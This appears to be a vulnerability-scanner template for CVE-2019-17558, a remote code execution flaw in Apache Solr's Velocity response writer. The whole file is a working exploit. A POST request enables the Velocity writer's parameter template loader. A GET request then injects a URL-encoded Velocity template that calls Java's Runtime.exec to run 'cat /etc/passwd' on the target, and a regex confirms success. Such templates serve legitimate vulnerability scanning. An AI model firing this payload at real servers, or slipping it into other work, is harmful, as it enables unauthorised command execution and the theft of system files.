id: cve-2019-17558
info:
  name: Solr RCE
reference:
- https://www.cvebase.com/cve/2019/17558
requests:
- body: "{\n  \"update-queryresponsewriter\": {\n    \"startup\": \"lazy\",\n    \"\
    name\": \"velocity\",\n    \"class\": \"solr.VelocityResponseWriter\",\n    \"\
    template.base.dir\": \"\",\n    \"solr.resource.loader.enabled\": \"true\",\n\
    \    \"params.resource.loader.enabled\": \"true\"\n  }\n}"
  headers:
  - Content-Type: application/json
  method: POST
  redirect: true
  url: '{{.BaseURL}}/solr/test/config'
- detections:
  - StatusCode() == 200 && RegexSearch("response", "root:[x*]:0:0:")
  headers:
  - Content-Type: application/json
  method: GET
  url: '{{.BaseURL}}/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(cat%20%2Fetc%2Fpasswd))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
